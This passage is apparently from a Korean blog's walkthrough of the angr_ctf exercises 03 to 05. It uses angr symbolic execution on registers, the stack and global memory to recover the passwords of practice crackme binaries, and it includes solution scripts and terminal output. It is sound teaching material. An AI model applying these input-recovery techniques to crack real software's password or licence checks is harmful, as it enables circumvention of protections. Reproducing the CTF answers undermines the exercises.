&#xC800;&#xC7A5;&#xD558;&#xACE0; 32&#xBE44;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2C8;&#xAE4C; 32&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; 3&#xAC1C;&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">initial_state.regs.eax = password0initial_state.regs.ebx = password1initial_state.regs.edx = password2</code></pre><p>&#xC774;&#xC81C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; state&#xC5D0; &#xC801;&#xC6A9;&#xC744; &#xD574;&#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00;  &#xCD94;&#xC801;&#xD560; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC740; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xBA54;&#xC778; &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xAC01;&#xAC01; eax, ebx, edx&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC01;&#xAC01; &#xC120;&#xC5B8;&#xD55C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xB300;&#xC785;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xACB0;&#xACFC;&#xAC12;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC704; &#xC608;&#xC2DC; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xAC01;&#xAC01; hex &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xCD9C;&#xB825;&#xC744; &#xD574;&#xC8FC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xC544;<del>~</del>&#xC8FC; &#xC27D;&#xAC8C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs python">solution0 = solution_state.se.eval(password0)solution1 = solution_state.se.eval(password1)solution2 = solution_state.se.eval(password2)solution = <span class="hljs-string">&apos;{} {} {}&apos;</span>.format(hex(solution0), hex(solution1), hex(solution2))  <span class="hljs-comment"># :string</span>print(solution)</code></pre><h2 id="sol03-py"><a href="#sol03-py" class="headerlink" title="sol03.py"></a>sol03.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x08048980</span>  <span class="hljs-comment"># :integer (probably hexadecimal)</span>  initial_state = project.factory.blank_state(addr=start_address)  password0_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, password0_size_in_bits)  password1_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>  password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, password1_size_in_bits)  password2_size_in_bits = <span class="hljs-number">32</span>  <span class="hljs-comment"># :integer</span>  password2 = claripy.BVS(<span class="hljs-string">&apos;password2&apos;</span>, password2_size_in_bits)    initial_state.regs.eax = password0  initial_state.regs.ebx = password1  initial_state.regs.edx = password2  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0)    solution1 = solution_state.se.eval(password1)    solution2 = solution_state.se.eval(password2)        solution = <span class="hljs-string">&apos;{} {} {}&apos;</span>.format(hex(solution0), hex(solution1), hex(solution2))  <span class="hljs-comment"># :string</span>    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol03.py ./<span class="hljs-number">03</span>_angr_symbolic_registersWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">245</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>,<span class="hljs-number">246</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048980</span> (main+<span class="hljs-number">0x26</span> <span class="hljs-keyword">in</span> <span class="hljs-number">03</span>_angr_symbolic_registers (<span class="hljs-number">0x8048980</span>))CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">07</span>:<span class="hljs-number">44</span>:<span class="hljs-number">14</span>,<span class="hljs-number">105</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-number">0xb9ffd04e</span> <span class="hljs-number">0xccf63fe8</span> <span class="hljs-number">0x8fd4d959</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">03</span>_angr_symbolic_registersEnter the password: <span class="hljs-number">0xb9ffd04e</span> <span class="hljs-number">0xccf63fe8</span> <span class="hljs-number">0x8fd4d959</span>Good Job.</code></pre><h1 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h1><p><img src="/2021/08/04/j0ker/angr_part3/8.png" alt="./anrgr_part3/Untitled%208.png"></p><p>&#xC790; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC785;&#xB825;&#xAC12;&#xB4E4;&#xC774; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB124;&#xC694;. &#xADF8;&#xB7FC; &#xC704;&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC744; initial state&#xC5D0; &#xC2A4;&#xD0DD;&#xC5D0; &#xB123;&#xC5B4;&#xC8FC;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; state&#xC5D0;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83; &#xCC98;&#xB7FC; &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC9C0; &#xC54A;&#xC744;&#xD150;&#xB370;&#x2026; &#xC774;&#xAC8C; &#xBB38;&#xC81C;&#xB124;&#xC694;!</p><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xC55E;&#xC5D0; &#xBB38;&#xC81C;&#xCC98;&#xB7FC; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB294; <code>scanf</code> &#xC774;&#xD6C4;&#xAC00; &#xB418;&#xC5B4;&#xC57C; &#xD560;&#xAC70;&#xACE0;&#xC694;&#x2026;. &#xADF8; &#xB4A4;&#xB85C;&#xB294; &#xBB58; &#xD574;&#xC57C;&#xD558;&#xC9C0;&#x2026; &#xC774;&#xB7F4; &#xB550; &#xCF54;&#xB4DC;&#xB97C; &#xBD05;&#xC2DC;&#xB2E4;!</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = ???  initial_state = project.factory.blank_state(addr=start_address)  initial_state.regs.ebp = initial_state.regs.esp  password0 = claripy.BVS(&apos;password0&apos;, ???)  ...  padding_length_in_bytes = ???  # :integer  initial_state.regs.esp -= padding_length_in_bytes  initial_state.stack_push(???)  # :bitvector (claripy.BVS, claripy.BVV, claripy.BV)  ...  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0)    ...    solution = ???    <span class="hljs-keyword">print</span> solution  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC774;&#xC804;&#xAE4C;&#xC9C0;&#xB294; &#xADF8;&#xB0E5; <code>scanf</code> &#xC774;&#xD6C4; &#xC5B4;&#xB514;&#xB4E0; &#xC0C1;&#xAD00;&#xC5C6;&#xACA0;&#xC9C0;&#xB77C;&#xB294; &#xB9C8;&#xC778;&#xB4DC;&#xB85C; &#xB300;&#xCDA9; &#xC9C0;&#xC815;&#xD588;&#xC9C0;&#xB9CC; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC880;&#xB9CC; &#xC790;&#xC138;&#xD788; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/9.png" alt="./angr_part3/Untitled%209.png"></p><p><code>scanf</code> &#xBC14;&#xB85C; &#xB4A4;&#xC758; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xBCF4;&#xBA74; esp&#xC5D0;&#xC11C; 0x10&#xC744; &#xB354;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; initial state&#xC5D0; &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD574;&#xC57C;&#xD560; &#xAC83;&#xC744; &#xC54C;&#xC558;&#xACE0;, &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xB294; &#xB300;&#xBD80;&#xBD84; esp&#xB098; ebp&#xB85C; &#xC870;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC77C;&#xB2E8; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xCC1C;&#xCC1C;&#xD558;&#xB2C8; <code>add esp, 0x10</code> &#xC774;&#xBD80;&#xBD84;&#xC740; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xBC14;&#xB85C; &#xB4A4;&#xBD80;&#xD130; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xC81C; &#xC2A4;&#xD0DD;&#xC5D0; &#xB300;&#xD55C; &#xD658;&#xACBD; &#xC138;&#xD305;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0;&#xB3C4; &#xC2A4;&#xD0DD;&#xC5D0; &#xC785;&#xB825;&#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC774; &#xC788;&#xC5C8;&#xC9C0;&#xB9CC; &#xC785;&#xB825;&#xAC12;&#xC744; &#xD558;&#xB098;&#xB9CC; &#xBC1B;&#xC544;&#xC11C; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8;&#xBD80;&#xD130; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD558;&#xBA74; &#xBB38;&#xC81C; &#xC5C6;&#xC774; angr&#xAC00; &#xC54C;&#xC544;&#xC11C; &#xBCC0;&#xC218;&#xAC00; &#xC2A4;&#xD0DD; &#xC5B4;&#xB514;&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xB294;&#xC9C0; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC9C0;&#xAE08;&#xC740; &#xADF8;&#xB7F0; &#xACFC;&#xC815;&#xC744; &#xB6F0;&#xC5B4;&#xB118;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; initial state&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD; &#xC0C1;&#xD669;&#xC744; &#xC124;&#xC815;&#xD574;&#xC904; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xBA3C;&#xC800; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xB54C;&#xCC98;&#xB7FC; esp&#xB97C; ebp&#xC5D0; &#xB300;&#xC785;&#xD558;&#xACE0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC744; &#xC120;&#xC5B8;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">initial_state.regs.ebp = initial_state.regs.esppassword0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, <span class="hljs-number">32</span>)password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, <span class="hljs-number">32</span>)</code></pre><p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C; IDA&#xB85C; &#xC2A4;&#xD0DD;&#xC758; &#xD06C;&#xAE30;&#xC640; &#xBCC0;&#xC218;&#xC758; &#xC704;&#xCE58;&#xB4E4;&#xC744; &#xD30C;&#xC545;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/10.png" alt="./anrgr_part3/Untitled%2010.png"></p><p>&#xC77C;&#xB2E8; &#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784;&#xC758; &#xD06C;&#xAE30;&#xB294; 0x18&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBCC0;&#xC218;&#xB4E4;&#xC774; <code>ebp-0xC</code>, <code>ebp-0x10</code>&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC8E0;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xBCC0;&#xC218; &#xD558;&#xB098;&#xB2F9; 4&#xBC14;&#xC774;&#xD2B8;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ebp&#xC5D0;&#xC11C; ebp-0x8&#xAE4C;&#xC9C0;&#xB294; &#xCD94;&#xC801;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xB294; &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xB4E4;&#xC774;&#xB124;&#xC694;! &#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC2A4;&#xD0DD;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xC8E0;!</p><pre><code class="hljs python">padding_length_in_bytes = <span class="hljs-number">8</span>  <span class="hljs-comment"># :integer</span>initial_state.regs.esp -= padding_length_in_bytesinitial_state.stack_push(password0)  <span class="hljs-comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>initial_state.stack_push(password1)  <span class="hljs-comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span></code></pre><p>&#xBA3C;&#xC800; 8&#xBC14;&#xC774;&#xD2B8;&#xB294; &#xC758;&#xBBF8;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8; esp&#xC5D0;&#xC11C; &#xADF8;&#xB9CC;&#xD07C; &#xBE7C;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xB4A4;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xC124;&#xC815;&#xD55C; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB4E4;&#xC744; push&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC5BC;&#xCD94; &#xC77C;&#xB2E8; &#xC6B0;&#xB9AC;&#xAC00; &#xCD94;&#xC801;&#xD560; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xAE4C;&#xC9C0; &#xC124;&#xC815;&#xD588;&#xC73C;&#xB2C8; &#xB098;&#xBA38;&#xC9C0;&#xB294; angr&#xD55C;&#xD14C; &#xB9E1;&#xACA8;&#xBCF4;&#xC8E0;!</p><h2 id="sol04-py"><a href="#sol04-py" class="headerlink" title="sol04.py"></a>sol04.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x08048697</span> <span class="hljs-comment"># after add esp, 0x10</span>  initial_state = project.factory.blank_state(addr=start_address)  initial_state.regs.ebp = initial_state.regs.esp  password0 = claripy.BVS(<span class="hljs-string">&apos;password0&apos;</span>, <span class="hljs-number">32</span>)  password1 = claripy.BVS(<span class="hljs-string">&apos;password1&apos;</span>, <span class="hljs-number">32</span>)  padding_length_in_bytes = <span class="hljs-number">8</span>  <span class="hljs-comment"># :integer</span>  initial_state.regs.esp -= padding_length_in_bytes  initial_state.stack_push(password0)  <span class="hljs-comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>  initial_state.stack_push(password1)  <span class="hljs-comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0)    solution1 = solution_state.se.eval(password1)        solution = <span class="hljs-string">&apos;{} {}&apos;</span>.format(solution0, solution1)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 ./sol04.py ./<span class="hljs-number">04</span>_angr_symbolic_stackCRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">08</span>:<span class="hljs-number">21</span>:<span class="hljs-number">43</span>,<span class="hljs-number">212</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-number">1704280884</span> <span class="hljs-number">2382341151</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">04</span>_angr_symbolic_stackEnter the password: <span class="hljs-number">1704280884</span> <span class="hljs-number">2382341151</span>Good Job.</code></pre><h1 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h1><p><img src="/2021/08/04/j0ker/angr_part3/11.png" alt="./angr_part3/Untitled%2011.png"></p><p>&#xD6C4;&#x2026; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xB531; &#xBD10;&#xB3C4; &#xC804;&#xC5ED;&#xBCC0;&#xC218;&#xC5D0;&#xB2E4; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294;&#xAC8C; &#xBB38;&#xC81C;&#xACA0;&#xB124;&#xC694;. &#xCF54;&#xB4DC;&#xC5D0; &#xC788;&#xB294; &#xC124;&#xBA85;&#xC744; &#xBCFC; &#xD544;&#xC694;&#xB3C4; &#xC5C6;&#xC744;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B;(&#xC774;&#xCBE4;&#xB418;&#xBA74; &#xB208;&#xAC10;&#xACE0;&#xB3C4; &#xD480; &#xC218; &#xC788;&#xC744;&#xB4EF; &#x3147;&#x3148;&#x3139;)</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = ???  initial_state = project.factory.blank_state(addr=start_address)  password0 = claripy.BVS(&apos;password0&apos;, ???)  ...  password0_address = ???  initial_state.memory.store(password0_address, password0)  ...  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    return ???  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(password0,cast_to=str)    ...    solution = ???    <span class="hljs-keyword">print</span> solution  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xC77C;&#xB2E8; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB294; &#xC774;&#xC804;&#xACFC; &#xAC19;&#xC774; <code>scanf</code> &#xC774;&#xD6C4;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC2A4;&#xD0DD;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xB300;&#xCDA9; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC55E;&#xC5D0;&#xC11C;&#xC640; &#xAC19;&#xC774; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC120;&#xC5B8;&#xD574;&#xC8FC;&#xBA74; &#xB418;&#xB294;&#xB370;, &#xC785;&#xB825;&#xC744; &#xD558;&#xB098;&#xB2F9; 8&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBC1B;&#xC73C;&#xB2C8;&#xAE4C; &#xD06C;&#xAE30;&#xB97C; 64&#xBE44;&#xD2B8;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">password0_address = <span class="hljs-number">0x0A1BA1C0</span>initial_state.memory.store(password0_address, password0)password1_address = <span class="hljs-number">0xA1BA1C8</span>initial_state.memory.store(password1_address, password1)password2_address = <span class="hljs-number">0xA1BA1D0</span>initial_state.memory.store(password2_address, password2)password3_address = <span class="hljs-number">0xA1BA1D8</span>initial_state.memory.store(password3_address, password3)</code></pre><p>&#xC55E;&#xC5D0;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC120;&#xC5B8;&#xD560; &#xB54C;&#xB294; <code>initial_state.regs.eax</code> &#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xC744; &#xD588;&#xC5C8;&#xC8E0;. &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;! &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xC8FC;&#xC18C;&#xC640; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; <code>store</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 